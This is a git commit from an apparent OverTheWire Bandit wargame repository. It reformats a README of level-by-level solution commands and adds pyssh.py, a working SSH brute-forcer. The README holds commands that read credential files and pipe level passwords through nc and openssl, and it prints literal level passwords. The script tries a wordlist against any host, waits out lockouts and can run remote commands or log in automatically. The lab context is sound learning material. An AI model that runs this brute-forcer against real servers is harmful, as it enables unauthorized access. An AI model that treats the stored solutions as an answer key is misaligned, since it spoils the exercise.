b7f6aaa2a5ec6053836b08b7d8bc74535200cf39
catx0rr <catx0rr@gmail.com>
2020-05-26 13:26:50 +0800

    updated

--- bandit/README.md
+++ bandit/README.md
@@ -3,125 +3,112 @@
 ---
 
 - bandit0
-    - Commands:
-        - ``` cat readme ```
+    - ``` cat readme ```
 
 - bandit1
-    - Commands:
-        - ``` file ./- ```
-        - ``` file $(pwd)/- ```
-        - ``` cat $(pwd)/- ```
+    - ``` file ./- ```
+    - ``` file $(pwd)/- ```
+    - ``` cat $(pwd)/- ```
 
 - bandit2
-    - Commands:
-        - ``` cat spaces\ in\ this\ filename```
-        - ``` cat "spaces in this filename"```
+    - ``` cat spaces\ in\ this\ filename```
+    - ``` cat "spaces in this filename"```
 
 - bandit3
-    - Commands:
-        - ``` find inhere/ -type f -name '.*'```
-        - ``` find inhere/ -type f -name '.*' -exec cat {} \;```
-        - ``` find inhere/ -type f -name \.\* -exec cat {} \;```
+    - ``` find inhere/ -type f -name '.*'```
+    - ``` find inhere/ -type f -name '.*' -exec cat {} \;```
+    - ``` find inhere/ -type f -name \.\* -exec cat {} \;```
 
 - bandit4
-    - Commands:
-        - ``` find . -type f -exec file {} \;```
-        - ``` find . -type f -name -file07 -exec cat {} \;```
-        - ``` find . -type f -name -file* -exec strings {} \;```
+    - ``` find . -type f -exec file {} \;```
+    - ``` find . -type f -name -file07 -exec cat {} \;```
+    - ``` find . -type f -name -file* -exec strings {} \;```
 
 - bandit5
-    - Commands:
-        - ```find inhere/ -type f ! -executable -size 1033c | xargs head -n1```
-        - ```find inhere/ -type f ! -executable -size 1033c -exec head -n1 {} +```
+    - ```find inhere/ -type f ! -executable -size 1033c | xargs head -n1```
+    - ```find inhere/ -type f ! -executable -size 1033c -exec head -n1 {} +```
 
 - bandit6
-    - Commands:
-        - ```find / -type f -user bandit7 -group bandit6 -size 33c -exec cat {} \; 2>/dev/null```
-        - ```find / -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null | xargs cat```
+    - ```find / -type f -user bandit7 -group bandit6 -size 33c -exec cat {} \; 2>/dev/null```
+    - ```find / -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null | xargs cat```
 
 - bandit7
-    - Commands:
-        - ```cat data.txt | grep millionth | awk '{print $2}'```
-        - ```awk '/^millionth/ {print $2}' data.txt```
+    - ```cat data.txt | grep millionth | awk '{print $2}'```
+    - ```awk '/^millionth/ {print $2}' data.txt```
 
 - bandit8
-    - Commands:
-        - ```cat data.txt | sort | uniq -u```
-        - ```cat data.txt | sort | uniq -c | tail -n14 | head -n1 | awk '{print $2}'```
+    - ```cat data.txt | sort | uniq -u```
+    - ```cat data.txt | sort | uniq -c | tail -n14 | head -n1 | awk '{print $2}'```
 
 - bandit9
-    - Commands:
-        - ```strings data.txt | grep '^.*==.*[a-zA-Z]$' | tail -n1 | cut -d' ' -f2```
-        - ```strings data.txt | grep '==.*' | tail -n1 | awk '{print $2}'```
+    - ```strings data.txt | grep '^.*==.*[a-zA-Z]$' | tail -n1 | cut -d' ' -f2```
+    - ```strings data.txt | grep '==.*' | tail -n1 | awk '{print $2}'```
 
 - bandit10
-    - Commands:
-        - ```cat data.txt | base64 -d | awk '{print $4}'```
-        - ```base64 -d data.txt | cut -d' ' -f4```
+    - ```cat data.txt | base64 -d | awk '{print $4}'```
+    - ```base64 -d data.txt | cut -d' ' -f4```
 
 - bandit11
-    - Commands:
-        - ```cat data.txt | tr A-Za-z N-ZA-Mn-za-m | awk '{print $4}'```
-        - ```tr A-Za-z N-ZA-Mn-za-m < data.txt | cut -d' ' -f4```
+    - ```cat data.txt | tr A-Za-z N-ZA-Mn-za-m | awk '{print $4}'```
+    - ```tr A-Za-z N-ZA-Mn-za-m < data.txt | cut -d' ' -f4```
 
 - bandit12
-    - Commands:
-        - ```mkdir /tmp/catx```
-        - ```cat data.txt | xxd -r > /tmp/catx/file```
-        - ```gunzip -c file > file2```
-        - ```bzip2 -dc file2 > file3```
-        - ```bzip2 -dc file3 > file4```
-        - ```bzip2 -dc file4 > file5```
-        - ```gunzip -c file5 > file6```
-        - ```tar -xvf file6```
-        - ```tar -xvf data5.bin```
-        - ```tar -xvf data6.bin```
-        - ```bzip2 -dc data6.bin > file7```
-        - ```tar -xvf file7```
-        - ```gunzip -c data8.bin > data9.bin```
-        - ```cat data9.bin | awk '{print $4}'```
+    - ```mkdir /tmp/catx```
+    - ```cat data.txt | xxd -r > /tmp/catx/file```
+    - ```gunzip -c file > file2```
+    - ```bzip2 -dc file2 > file3```
+    - ```bzip2 -dc file3 > file4```
+    - ```bzip2 -dc file4 > file5```
+    - ```gunzip -c file5 > file6```
+    - ```tar -xvf file6```
+    - ```tar -xvf data5.bin```
+    - ```tar -xvf data6.bin```
+    - ```bzip2 -dc data6.bin > file7```
+    - ```tar -xvf file7```
+    - ```gunzip -c data8.bin > data9.bin```
+    - ```cat data9.bin | awk '{print $4}'```
 
 - bandit13 
-    - Commands:
-        - ```ssh bandit14@localhost -i sshkey.private```
-        - ```find /etc/bandit_pass/ -type f -user bandit14 -perm -400 | xargs cat```
+    - ```ssh bandit14@localhost -i sshkey.private```
+    - ```find /etc/bandit_pass/ -type f -user bandit14 -perm -400 | xargs cat```
 
 - bandit14
-    - Commands:
-        - ```echo "4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e" | nc localhost 30000 | tr '\n' ' ' | cut -d' ' -f2```
+    - ```echo "4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e" | nc localhost 30000 | tr '\n' ' ' | cut -d' ' -f2```
 
 - bandit15
-    - Commands:
-        - ```echo 'BfMYroe26WYalil77FoDi9qh59eK5xNr' | openssl s_client -connect 127.0.0.1:30001 -quiet -ign_eof | tr '\n' ' ' | cut -d' ' -f2```
+    - ```echo 'BfMYroe26WYalil77FoDi9qh59eK5xNr' | openssl s_client -connect 127.0.0.1:30001 -quiet -ign_eof | tr '\n' ' ' | cut -d' ' -f2```
 
 - bandit16
-    - Commands:
-        - ```nc -z -v 127.0.0.1 31000-32000```
-        - ```nmap -sV -p 31000-32000 127.0.0.1```
-        - ```echo 'cluFn7wTiGryunymYOu4RcffSxQluehd' | openssl s_client -connect 127.0.0.1:31790 -quiet -ign_eof > /tmp/id_rsa```
-        - ```chmod 600 /tmp/id_rsa```
-        - ```ssh -i /tmp/id_rsa bandit17@127.0.0.1```
-        - ```find /etc/bandit_pass/ -user bandit17 -perm -400 | xargs cat```
+    - ```nc -z -v 127.0.0.1 31000-32000```
+    - ```nmap -sV -p 31000-32000 127.0.0.1```
+    - ```echo 'cluFn7wTiGryunymYOu4RcffSxQluehd' | openssl s_client -connect 127.0.0.1:31790 -quiet -ign_eof > /tmp/id_rsa```
+    - ```chmod 600 /tmp/id_rsa```
+    - ```ssh -i /tmp/id_rsa bandit17@127.0.0.1```
+    - ```find /etc/bandit_pass/ -user bandit17 -perm -400 | xargs cat```
 
 - bandit17
-    - Commands:
-        - ```diff passwords.old passwords.new | tail -n1 | cut -d ' ' -f2```
+    - ```diff passwords.old passwords.new | tail -n1 | cut -d ' ' -f2```
 
 - bandit18
-    - Commands:
-        - ```ssh -p 2220 -t bandit18@bandit.labs.overthewire.org /bin/sh```
-        - ```ssh -p 2220 bandit18@bandit.labs.overthewire.org "bash --norc"```
-        - ```cat readme```
+    - ```ssh -p 2220 -t bandit18@bandit.labs.overthewire.org /bin/sh```
+    - ```ssh -p 2220 bandit18@bandit.labs.overthewire.org "bash --norc"```
+    - ```cat readme```
 
 - bandit19
-    - Commands:
-        - ```./bandit20-do cat /etc/bandit_pass/bandit20```
+    - ```./bandit20-do cat /etc/bandit_pass/bandit20```
 
 - bandit20
-    - Commands:
-        - ```find /etc/bandit_pass/ -type f -perm -400 -user bandit20 | xargs cat | nc -lvp 1337```
-        - ```./suconnect 1337```
+    - ```find /etc/bandit_pass/ -type f -perm -400 -user bandit20 | xargs cat | nc -lvp 1337```
+    - ```./suconnect 1337```
 
 - bandit21
-    - Commands:
-        -
+    - ``` find /etc/cron.d/ -type f -exec grep bandit22 {} +```
+    - ```cat /usr/bin/cronjob_bandit22.sh```
+    - ```cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv```
+
+- bandit22
+    - ```find /etc/cron.d/ -type f -user root -exec grep bandit23 {} + && find /usr/bin -user bandit23 -exec cat {} \;```
+    - ```echo I am user bandit23 | md5sum | awk '{print $1}' | xargs echo /tmp/ | sed 's/ //g' | xargs cat```
+
+- bandit23
+    -
---
+++ bandit/pyssh.py
@@ -0,0 +1,343 @@
+#!/usr/bin/env python
+
+'''
+    pyssh.py - A simple ssh bruteforcer.
+
+        This script is made to automate my www.overthewire.org bandit lab.
+        Make sure you have permissions in using the script to ssh servers.
+
+    Disclaimer:
+        I am not liable for attacking / bruteforcing ssh servers using this script.
+
+    NOTE:
+        --connect option only works on linux.
+
+    DEPENDENCIES:
+        sshpass
+
+        sudo apt-get install -y sshpass
+'''
+
+import argparse
+import paramiko
+import platform
+import socket
+import subprocess
+import sys
+import time
+
+
+FAILED = '\033[31m[-]\033[0;0m'
+SUCCESS = '\033[32m[+]\033[0;0m'
+PROMPT = '\033[36m[>]\033[0;0m'
+WORKING = '\033[33m[*]\033[0;0m'
+
+
+def get_os():
+
+    # Get Platform | LINUX | WINDOWS
+    return platform.system()
+
+
+def is_ssh_open(hostname, username, password, port, delay):
+
+    # Initialize ssh client
+
+    ssh = paramiko.SSHClient()
+
+    # Accept unknown host
+
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+
+        ssh.connect(hostname=hostname, username=username, password=password, port=port, timeout=1)
+
+    # Host unreachable
+
+    except socket.timeout:
+
+        print('%s Target host is unreachable. Session timed out.' % (FAILED))
+        sys.exit(1)
+
+    except socket.gaierror:
+        print('%s Unable to find target host.' % (FAILED))
+        sys.exit(1)
+
+    # Failed Authentication
+
+    except paramiko.AuthenticationException as err:
+
+        print('%s %s to target host on port %s' % (FAILED, err, port))
+
+    # Retry with delay if detected
+        # Default (Fastest): 1 min
+        # 3: (Fast): 5 min
+        # 2: (Slow): 15 min
+        # 1: (Slowest): 1 hour
+
+    except paramiko.SSHException:
+
+        print('%s Connection Exceeded. Retrying in %s second(s).' % (PROMPT, delay))
+
+        # Cancelable timeout
+        for i in range(1, delay):
+            time.sleep(1)
+
+        return is_ssh_open(hostname, username, password, port, delay)
+
+    else:
+
+        # Connection established to ssh
+        print('%s Connection Successful to target host on port %s.\n%s Password: %s' % (SUCCESS, port, SUCCESS, password))
+        return True
+
+def ssh_execute(hostname, username, password, port, command):
+
+    # Execute a command to a server
+    ssh = paramiko.SSHClient()
+
+    try:
+        # Accept unknown host
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        # standard connection
+        ssh.connect(hostname=hostname, username=username, password=password, port=port, timeout=1)
+
+        # get the stdout  and error
+        stdin, stdout, stderr = ssh.exec_command(command)
+
+    except:
+        pass
+
+    else:
+
+        output = stdout.readlines()
+        error = stderr.readlines()
+
+        if output:
+            print('%s Command Executed: %s' % (SUCCESS, command))
+            return '\n' + '\r'.join(output)
+
+        if error:
+            print('%s Command Executed: %s' % (SUCCESS, command))
+            return '\n' + '\r'.join(error)
+
+
+def open_passfile(host, username, password_file, port, delay):
+
+    try:
+        with open(password_file, 'r') as passfile:
+
+            print('%s Connecting to ssh server.. ' % (WORKING))
+
+            # perform brute force
+            for password in passfile:
+
+                password = password.strip()
+
+                if is_ssh_open(host, username, password, port, delay):
+
+                    password_found = password
+
+                    passfile.close()
+
+                    return password_found
+
+    except FileNotFoundError:
+        print('%s %s not found. Terminating script..' % (FAILED, password_file))
+
+
+def auto_connect(username, password, port, host):
+
+    os = get_os()
+
+    if os == "Windows":
+
+        print('%s ERROR: Auto Connect feature not supported on Windows platform.' % FAILED)
+        sys.exit(0)
+
+    if os == "Linux":
+
+        # Check if sshpass is installed
+        check_sshpass = subprocess.call(
+            [
+                '/bin/bash',
+                '-c',
+                "dpkg -l | grep sshpass"
+            ]
+        )
+
+        if check_sshpass == 1:
+            print('%s ERROR: Unable to connect. sshpass not found.' % FAILED)
+            sys.exit(0)
+
+        if check_sshpass == 0:
+
+            port = str(port)
+
+            subprocess.call(
+                [
+                    '/bin/bash',
+                    '-c',
+                    "sshpass -p \'%s\' ssh -p %s %s@%s" % (password, port, username, host)
+                ]
+            )
+
+
+def main():
+
+    # Create parser
+
+    parser = argparse.ArgumentParser(
+        description='A Simple python SSH bruteforce script.',
+        allow_abbrev=False
+    )
+
+    parser.add_argument(
+        '-H', '--host',
+        metavar='',
+        required=True,
+        help='IP address or Hostname of SSH server to authenticate.'
+    )
+
+    parser.add_argument(
+        '-u', '--username',
+        metavar='',
+        required=True,
+        help='username. EX: [username]@1.1.1.1'
+    )
+
+    parser.add_argument(
+        '-p', '--port',
+        metavar='',
+        help='Port 22 is default. If not specified'
+    )
+
+    parser.add_argument(
+        '-t', '--timeout',
+        metavar='',
+        help='If the server detected a bruteforcer, adds a delay timeout 4 as default fastest 1 is the slowest'
+    )
+
+    # Group parser for password authentication
+
+    group_pass = parser.add_mutually_exclusive_group(
+        required=True
+    )
+
+    group_pass.add_argument(
+        '-L', '--passwordlist',
+        metavar='',
+        help='Pass a file.txt that contain lists of passwords.'
+    )
+
+    group_pass.add_argument(
+        '-P', '--password',
+        metavar='',
+        help='Pass a password as argument to authenticate in ssh.'
+    )
+
+    # Group parser for action
+
+    group_action = parser.add_mutually_exclusive_group()
+
+    group_action.add_argument(
+        '-e', '--execute',
+        metavar='',
+        help='Execute a command to the server. Must be enclosed as string and used alongside with --password.'
+    )
+
+    group_action.add_argument(
+        '-c', '--connect',
+        action='store_true',
+        help='Auto connect to SSH if the password is specified or found in the password list.'
+
+    )
+
+    args = parser.parse_args()
+
+    # Timeout default
+    if args.timeout is None:
+        delay = 1
+
+    # If timeout param is called and set
+    # This will only trigger if a server detects bruteforce
+
+    # 1 minute timeout
+    elif args.timeout == '4':
+        delay = 60
+
+    # 5 minute timeout
+    elif args.timeout == '3':
+        delay = 300
+
+    # 15 minute timeout
+    elif args.timeout == '2':
+        delay = 900
+
+    # 45 minute timeout
+    elif args.timeout == '1':
+        delay = 2700
+
+    else:
+        print('%s Error: Timeout must be 1 - 4.' % (FAILED))
+        sys.exit(1)
+
+    # Parse arguments
+    username = args.username
+    host = args.host
+    passwd_list = args.passwordlist
+    passwd = args.password
+    connection = args.connect
+    command = args.execute
+
+    # Default values
+    port = 22
+
+    # Check if port is specified
+
+    try:
+        if args.port:
+            port = int(args.port)
+
+    except ValueError:
+        print('%s Incorrect port specified.' % FAILED)
+        sys.exit(1)
+
+    # Initialize password found
+    password_found = None
+
+    # Execute if --password option is used
+
+    if passwd:
+
+        is_ssh_open(host, username, passwd, port, delay)
+
+        if command:
+
+            output = ssh_execute(host, username, passwd, port, command)
+
+            if output:
+                print(output)
+
+        # Connect to ssh using sshpass if --connect is specified
+        if connection and passwd:
+
+            auto_connect(username, passwd, port, host)
+
+    # Execute if --passwordlist option is used
+
+    if passwd_list:
+
+        # Read the passwordlist using --passwordlist option
+        password_found = open_passfile(host, username, passwd_list, port, delay)
+
+        # Connect to ssh using sshpass if --connect is specified
+        if connection and password_found:
+
+            auto_connect(username, password_found, port, host)
+
+
+if __name__ == '__main__':
+    main()
